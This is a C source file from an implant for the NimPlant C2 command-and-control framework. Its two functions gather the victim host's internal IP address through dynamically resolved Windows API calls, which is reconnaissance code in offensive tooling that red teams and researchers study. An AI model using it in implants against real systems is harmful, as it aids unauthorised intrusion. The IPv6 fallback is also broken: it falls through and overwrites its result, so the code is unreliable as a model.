/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Used by the Windows Sockets API.
 * 
 * Contains declarations for the Winsock API, including functions, macros, data structures, 
 * and constants used for network programming on Windows.
 * 
 * https://learn.microsoft.com/en-us/windows/win32/api/winsock2/
 */
#include <winsock2.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#include <windows.h>

/**
 * Used by the Windows HTTP services.
 * 
 * Contains manifests, macros, types and prototypes for Windows HTTP Services.
 * https://learn.microsoft.com/en-us/windows/win32/api/winhttp/
 */
#include <winhttp.h>

/**
 * Used by the IP Helper API.
 * 
 * Contains manifests, macros, types and prototypes for the IP Helper API.
 * https://learn.microsoft.com/en-us/windows/win32/api/iphlpapi/
 */
#include <iphlpapi.h>

/**
 * Windows Sockets 2 API.
 * 
 * Contains interfaces to use Windows sockets.
 * https://learn.microsoft.com/en-us/windows/win32/api/ws2tcpip/
 */
#include <ws2tcpip.h>

/**
 * Convert the given unicast address to string.
 *
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param PIP_ADAPTER_UNICAST_ADDRESS pUnicast A unicast address to convert
 * @return char* The unicast address converted to string.
 */
char* ConvertAddressToString(struct Relocatable* context, PIP_ADAPTER_UNICAST_ADDRESS pUnicast) {
    char addressBuffer[INET6_ADDRSTRLEN];
    DWORD addressBufferSize = sizeof(addressBuffer);

    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
        struct sockaddr_in* sa_in = (struct sockaddr_in*)pUnicast->Address.lpSockaddr;
        context->functions.inet_ntop(AF_INET, &(sa_in->sin_addr), addressBuffer, addressBufferSize);
    } else if (pUnicast->Address.lpSockaddr->sa_family == AF_INET6) {
        struct sockaddr_in6* sa_in6 = (struct sockaddr_in6*)pUnicast->Address.lpSockaddr;
        context->functions.inet_ntop(AF_INET6, &(sa_in6->sin6_addr), addressBuffer, addressBufferSize);
    } else {
        return NULL;
    }

    char* ipAddressString = (char*) context->functions.calloc(context->functions.strlen(addressBuffer) + 1, sizeof(char));
    if (ipAddressString != NULL) {
        context->functions.strcpy(ipAddressString, addressBuffer);
    }
    return ipAddressString;
}

/**
 * Get the internal IP of this device.
 *
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @return char* The output string to save the IP to (or NULL).
 */
char* GetPrimaryIPAddress(struct Relocatable* context) {
    ULONG outBufLen = 0;
    PIP_ADAPTER_ADDRESSES pAddresses = NULL;
    DWORD dwRetVal = 0;
    char* ipAddressString = NULL;
    char* ipv6AddressString = NULL;

    // Initial call to determine the required buffer size
    dwRetVal = context->functions.GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen);
    if (dwRetVal != ERROR_BUFFER_OVERFLOW) {
        goto RETURN_UNKNOWN;
    }

    // Allocate memory based on the required buffer size
    pAddresses = (IP_ADAPTER_ADDRESSES *) context->functions.calloc(outBufLen, sizeof(uint8_t));
    if (pAddresses == NULL) {
        goto RETURN_UNKNOWN;
    }

    // Retrieve adapter addresses
    dwRetVal = context->functions.GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen);
    if (dwRetVal == NO_ERROR) {
        PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
            while (pUnicast != NULL) {
                if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                    ipAddressString = ConvertAddressToString(context, pUnicast);
                    if (ipAddressString != NULL) {
                        goto CLEANUP_AND_RETURN;
                    }
                } else if (pUnicast->Address.lpSockaddr->sa_family == AF_INET6 && ipv6AddressString == NULL) {
                    // Store the IPv6 address temporarily, but prioritize IPv4
                    ipv6AddressString = ConvertAddressToString(context, pUnicast);
                }
                pUnicast = pUnicast->Next;
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }

    // If no IPv4 address was found, return the stored IPv6 address
    if (ipAddressString == NULL && ipv6AddressString != NULL) {
        ipAddressString = ipv6AddressString;
        ipv6AddressString = NULL; // Prevent double free
    }

RETURN_UNKNOWN:
    DEFINE_STRING(sUnknown, "[UNKNOWN]");
    ipAddressString = (char*) context->functions.calloc(context->functions.strlen(sUnknown) + 1, sizeof(char));
    if (ipAddressString != NULL) context->functions.strcpy(ipAddressString, sUnknown);
    
CLEANUP_AND_RETURN:
    if (ipv6AddressString) context->functions.free(ipv6AddressString);
    if (pAddresses) context->functions.free(pAddresses);

    return ipAddressString;
}